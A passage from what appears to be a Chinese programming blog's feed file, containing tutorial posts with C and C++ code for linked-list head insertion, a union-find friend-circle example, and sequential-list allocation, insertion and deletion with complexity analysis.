class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//表尾的-&gt;next应为NULL</span></span><br><span class="line">    <span class="keyword">return</span> L; <span class="comment">//返回创建好的单链表</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0402-头插法"><a href="#0x0402-头插法" class="headerlink" title="0x0402 头插法"></a>0x0402 头插法</h3><blockquote><p>**算法思想: **</p><p>初始化单链表;<br>while 循环{<br>    每次取一个数据元素e;<br>    InsertNextNode(L, e); &#x2F;&#x2F;使用结点后插法插入数据元素<br>}</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 头插法建立单链表(带头结点)</span></span><br><span class="line"><span class="comment"> * @param &#123;LinkList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList&amp; L)</span> &#123;</span><br><span class="line">    LNode* s;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    L = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//创建头结点</span></span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>; <span class="comment">//初始化为空链表(必要,避免脏数据)</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e); <span class="comment">//输入结点的值</span></span><br><span class="line">    <span class="keyword">while</span> (e != <span class="number">999</span>) &#123; <span class="comment">//此处999表示输入999则结束输入</span></span><br><span class="line">        s = (LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode)); <span class="comment">//开辟一个空间存放新的结点</span></span><br><span class="line">        s-&gt;data = e;</span><br><span class="line">        s-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = s; <span class="comment">//将新的结点插入表中,L为头指针</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于头插法的应用还有很重要的一项: <strong>链表的逆置</strong>! 其主要思想还是在于头插法.🥳</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>并查集</title>
      <link href="/2022/04/06/53ef32234a17-q1jun/"/>
      <url>/2022/04/06/53ef32234a17-q1jun/</url>
      
        <content type="html"><![CDATA[<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;string, string&gt; leader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> *并查集:</span></span><br><span class="line"><span class="comment"> *如果要判断两个人是否属于一个朋友圈,只需要判断他们的leader是否为同一个人,这是一个查询的过程.</span></span><br><span class="line"><span class="comment"> *如果两个人是好友关系,则需要把两个人并入同一个朋友圈,这是一个合并的过程.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//每一行表示朋友关系</span></span><br><span class="line">string input[] = &#123;</span><br><span class="line">    <span class="string">&quot;周芷若&quot;</span>,<span class="string">&quot;张无忌&quot;</span>,</span><br><span class="line">    <span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;韩小昭&quot;</span>,</span><br><span class="line">    <span class="string">&quot;成昆&quot;</span>,<span class="string">&quot;陈友谅&quot;</span>,</span><br><span class="line">    <span class="string">&quot;杨逍&quot;</span>,<span class="string">&quot;纪晓芙&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试每行的两人是否为朋友</span></span><br><span class="line">string test[] = &#123;</span><br><span class="line">    <span class="string">&quot;周芷若&quot;</span>,<span class="string">&quot;韩小昭&quot;</span>,</span><br><span class="line">    <span class="string">&quot;张无忌&quot;</span>,<span class="string">&quot;成昆&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setLeader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> totalPerson = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; totalPerson; i++) &#123;</span><br><span class="line">        leader[input[i]] = input[i]; <span class="comment">//将自己初始化为自己的领导</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查找领导,看看究竟是谁</span></span><br><span class="line"><span class="function">string <span class="title">findLeader</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    string r = s;</span><br><span class="line">    <span class="keyword">while</span> (leader[r] != r) &#123;</span><br><span class="line">        r = leader[r];<span class="comment">//没找到的话,一直往上找</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将两个领导的朋友圈合并,从此 leaderX和leaderY是同一个朋友圈了</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">uniteSet</span><span class="params">(string leaderX, string leaderY)</span> </span>&#123;</span><br><span class="line">    leader[leaderX] = leaderY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> numberOfSets = <span class="number">7</span>; <span class="comment">//最开始有7个不重复的人</span></span><br><span class="line">    <span class="comment">//初始化领导</span></span><br><span class="line">    <span class="built_in">setLeader</span>();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">4</span>; <span class="comment">//人物关系的数组有4行</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; n;j++) &#123;</span><br><span class="line">        string u = input[i++];</span><br><span class="line">        string v = input[i++];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//找领导</span></span><br><span class="line">        u = <span class="built_in">findLeader</span>(u);</span><br><span class="line">        v = <span class="built_in">findLeader</span>(v);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//领导不想等,则合并两个朋友圈</span></span><br><span class="line">        <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">            <span class="built_in">uniteSet</span>(u, v);</span><br><span class="line">            numberOfSets--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    n = <span class="number">2</span>; <span class="comment">//待测试人物关系的数组有2行</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; n;j++) &#123;</span><br><span class="line">        string u = test[i++];</span><br><span class="line">        string v = test[i++];</span><br><span class="line"></span><br><span class="line">        <span class="comment">//找领导</span></span><br><span class="line">        u = <span class="built_in">findLeader</span>(u);</span><br><span class="line">        v = <span class="built_in">findLeader</span>(v);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果领导不同,则不属于同一个朋友圈</span></span><br><span class="line">        <span class="keyword">if</span> (u != v) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">//如果两个领导相同,则肯定属于同一个朋友圈</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; numberOfSets &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 算法 </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[数据结构]线性表中简单的顺序表</title>
      <link href="/2022/03/24/8994490181cd-q1jun/"/>
      <url>/2022/03/24/8994490181cd-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="线性表-Linear-List"><a href="#线性表-Linear-List" class="headerlink" title="线性表(Linear List)"></a>线性表(Linear List)</h1><p>线性表是具有<code>相同数据类型</code>，每个数据元素<code>所占空间一样大</code>的n个数据元素的<code>有限</code>序列(有次序)。</p><p>L&#x3D;($a_1,a_2,…,a_i,a_{i+1},…,a_n$)</p><p>其中$a_i$是线性表中的“第i个”元素线性表中的<code>位序</code></p><p>$a_1$是表头元素；$a_n$是表尾元素。</p><p>除第一个元素外，每个元素有且仅有一个<code>直接前驱</code>；除最后一个元素外，每个元素有且仅有一个<code>直接后继</code>。</p><h2 id="0x01-线性表的常用实现函数："><a href="#0x01-线性表的常用实现函数：" class="headerlink" title="0x01 线性表的常用实现函数："></a>0x01 线性表的常用实现函数：</h2><p>InitList(&amp;L): 初始化表。构造一个空的线性表L，分配内存空间。<br>DestroyList(&amp;L)：销毁操作。销毁线性表，并释放线性表L所占用的内存空间。</p><p>ListInsert(&amp;L,i,e)：插入操作。在表L中的第i个位置上插入指定元素e。<br>ListDelete(&amp;L,i,&amp;e)：删除操作。删除表L中第i个位置的元素，并用e返回删除元素的值。</p><p>LocateElem(L,e)：按值查找操作。在表L中查找具有给定关键字值的元素。<br>GetElem(L,i)：按位查找操作。获取表L中第i个位置的元素的值。</p><p>其他常用操作： Length(L)：求表长。返回线性表L的长度，即L中数据元素的个数。<br>PrintList(L)：输出操作。按前后顺序输出线性表L的所有元素值。<br>Empty(L)：判空操作。若L为空表，则返回true，否则返回false。</p><h2 id="0x02-顺序表"><a href="#0x02-顺序表" class="headerlink" title="0x02 顺序表"></a>0x02 顺序表</h2><p>顺序表是用<code>顺序存储</code>的方式实现线性表。</p><blockquote><p>顺序存储：</p><p>把逻辑上相邻的元素存储在物理位置上也相邻的存储单元中，元素之间的关系由存储单元的邻接关系来体现。</p></blockquote><p>顺序表的特点：</p><ol><li>随机访问，即可在O(1)的时间内找到第 i 个元素。</li><li>存储密度高，每个节点之存储数据元素。</li><li>扩展容量不方便(即便采用动态分配的方式实现，拓展长度的时间复杂度也比较高)。</li><li>插入、删除操作不方便，需要移动大量元素。</li></ol><h3 id="0x0201-顺序表–静态分配"><a href="#0x0201-顺序表–静态分配" class="headerlink" title="0x0201 顺序表–静态分配"></a>0x0201 顺序表–静态分配</h3><p>静态分配方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10<span class="comment">//定义最大长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">  ElemType data[MaxSize];<span class="comment">//用静态的“数组”来存放数据元素</span></span><br><span class="line">  <span class="type">int</span> length;<span class="comment">//顺序表的当前长度</span></span><br><span class="line">&#125;SqList;<span class="comment">//顺序表的类型定义(静态分配方式)</span></span><br></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10 <span class="comment">//定义最大长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> data[MaxSize];</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">&#125;SqList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * @description: 初始化顺序表 </span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(SqList&amp; L)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; MaxSize; i++) &#123;</span><br><span class="line">        L.data[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    SqList L; <span class="comment">//声明一个顺序表</span></span><br><span class="line">    InitList(L); <span class="comment">//初始化顺序表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; L.length; i++) &#123; <span class="comment">//打印整个 data 数组</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data[%d]=%d\n&quot;</span>, i, L.data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//最好使用 GetElem(L , i)这种方式来访问顺序表的数据元素</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>顺序表的静态分配的局限性在于顺序表的表长在开始时就要确定，然后就无法更改（存储空间是<code>静态</code>的）。</p></blockquote><h3 id="0x0202-顺序表–动态分配"><a href="#0x0202-顺序表–动态分配" class="headerlink" title="0x0202 顺序表–动态分配"></a>0x0202 顺序表–动态分配</h3><p>为了动态分配存储空间，提高内存空间的使用效率，可以采用动态分配的分配方式。</p><p>动态分配方式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 10 <span class="comment">//顺序表的初始长度</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sqlist_dynamic</span> //顺序表的类型定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ElemType* data; <span class="comment">//指向动态分配数组的指针</span></span><br><span class="line">    <span class="type">int</span> MaxSize; <span class="comment">//顺序表的最大容量</span></span><br><span class="line">    <span class="type">int</span> length; <span class="comment">//顺序表的当前长度</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>动态分配：动态申请和释放内存空间。</p><ul><li>申请：malloc函数</li><li>释放：free函数</li></ul></blockquote><p>举个栗子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> InitSize 10 <span class="comment">//顺序表的初始长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>//顺序表的类型定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span>* data; <span class="comment">//指向动态分配数组的指针</span></span><br><span class="line">    <span class="type">int</span> MaxSize; <span class="comment">//顺序表的最大容量</span></span><br><span class="line">    <span class="type">int</span> length; <span class="comment">//顺序表的当前长度</span></span><br><span class="line">&#125;Sqlist_dynamic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 初始化顺序表 </span></span><br><span class="line"><span class="comment"> * @param &#123;Sqlist_dynamic&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitList</span><span class="params">(Sqlist_dynamic&amp; L)</span> &#123;</span><br><span class="line">    <span class="comment">//用 malloc 函数申请一片连续的存储空间</span></span><br><span class="line">    L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>(InitSize * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    L.length = <span class="number">0</span>;</span><br><span class="line">    L.MaxSize = InitSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 增加动态数组的长度 </span></span><br><span class="line"><span class="comment"> * @param &#123;Sqlist_dynamic&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; len</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">IncreaseSize</span><span class="params">(Sqlist_dynamic&amp; L, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span>* p = L.data;</span><br><span class="line">    L.data = (<span class="type">int</span>*)<span class="built_in">malloc</span>((L.MaxSize + len) * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L.length; i++) &#123;</span><br><span class="line">        L.data[i] = p[i]; <span class="comment">//将数据复制到新区域</span></span><br><span class="line">    &#125;</span><br><span class="line">    L.MaxSize = L.MaxSize + len; <span class="comment">//顺序表最大长度 + len</span></span><br><span class="line">    <span class="built_in">free</span>(p); <span class="comment">//释放原来的内存空间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    Sqlist_dynamic L;</span><br><span class="line">    InitList(L);</span><br><span class="line">    <span class="comment">/* <span class="doctag">TODO:</span> 随意插入几个元素 */</span></span><br><span class="line">    IncreaseSize(L, <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x0203-顺序表的插入"><a href="#0x0203-顺序表的插入" class="headerlink" title="0x0203 顺序表的插入"></a>0x0203 顺序表的插入</h3><h4 id="实现："><a href="#实现：" class="headerlink" title="实现："></a>实现：</h4><p>举第一个栗子🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 顺序表的插入，将元素e插入i处</span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;*&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ListInsert</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L.length;j &gt;= i;j--) &#123; <span class="comment">//将第i个元素及之后的元素后移</span></span><br><span class="line">        L.data[j] = L.data[j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L.data[i - <span class="number">1</span>] = e; <span class="comment">//在位置i处放入e</span></span><br><span class="line">    L.length++; <span class="comment">//长度加1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处省略：</p><ul><li>判断i是否合法，即 <code>i</code> 在<code>[1,length+1]</code>。</li><li>判断顺序表是否存满，若存满则无法插入数据。</li><li>返回是否操作成功的提示。</li></ul><p>举第二个栗子🌰（改进后）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 顺序表的插入，将元素e插入i处</span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;bool&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert_better</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, <span class="type">int</span> e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length + <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//判断i的范围是否合法</span></span><br><span class="line">    <span class="keyword">if</span> (L.length &gt;= MaxSize) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//判断当前空间是否能放下e</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = L.length; j &gt;= i; j--) &#123; <span class="comment">//将第i个元素及之后的元素后移</span></span><br><span class="line">        L.data[j] = L.data[j - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    L.data[i - <span class="number">1</span>] = e; <span class="comment">//在位置i处放入e</span></span><br><span class="line">    L.length++; <span class="comment">//长度加1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">//插入成功，返回true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="时间复杂度分析："><a href="#时间复杂度分析：" class="headerlink" title="时间复杂度分析："></a>时间复杂度分析：</h4><p><strong>最好情况</strong>：新元素插入到表尾，不需要移动元素。<br>i &#x3D; n + 1，循环0次；最好时间复杂度 &#x3D; $O(1)$</p><p><strong>最坏情况</strong>：新元素插入到表头，需要将n个元素全部向后移动<br>i &#x3D; 1，循环n次；最坏时间复杂度 &#x3D; $O(n)$</p><p><strong>平均情况</strong>：新元素插入到任何一个位置的概率相同，即 i &#x3D; 1,2,3,……,length+1 的概率都是$p &#x3D; 1&#x2F;(n+1)$<br>当i &#x3D; 1，循环n次；当i &#x3D; 2时，循环n - 1次；当i &#x3D; 3时，循环n - 2次；……当i &#x3D; n + 1时,循环0次。<br>平均循环次数 &#x3D; $np+(n-1)p+(n-2)p+……+1·p &#x3D; [\frac{n(n+1)}2]·[\frac{1}{n+1}]&#x3D;\frac{n}2$<br>$\therefore$ 平均时间复杂度 &#x3D; $O(n)$</p><h3 id="0x0204-顺序表的删除"><a href="#0x0204-顺序表的删除" class="headerlink" title="0x0204 顺序表的删除"></a>0x0204 顺序表的删除</h3><h4 id="实现：-1"><a href="#实现：-1" class="headerlink" title="实现："></a>实现：</h4><p>举个栗子🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*** </span></span><br><span class="line"><span class="comment"> * @description: 删除操作。删除表L中第i个位置的元素，并用e返回删除元素的值。</span></span><br><span class="line"><span class="comment"> * @param &#123;SqList&amp;&#125; L</span></span><br><span class="line"><span class="comment"> * @param &#123;int&#125; i</span></span><br><span class="line"><span class="comment"> * @param &#123;int&amp;&#125; e</span></span><br><span class="line"><span class="comment"> * @return &#123;bool&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(SqList&amp; L, <span class="type">int</span> i, <span class="type">int</span>&amp; e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (i&lt;<span class="number">1</span> || i&gt;L.length) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//判断i的范围是否有效</span></span><br><span class="line">    e = L.data[i - <span class="number">1</span>]; <span class="comment">//将被删除的元素值赋值给e</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = i;j &lt; L.length;j++) &#123; <span class="comment">//将第i个位置后的元素前移</span></span><br><span class="line">        L.data[j - <span class="number">1</span>] = L.data[j];</span><br><span 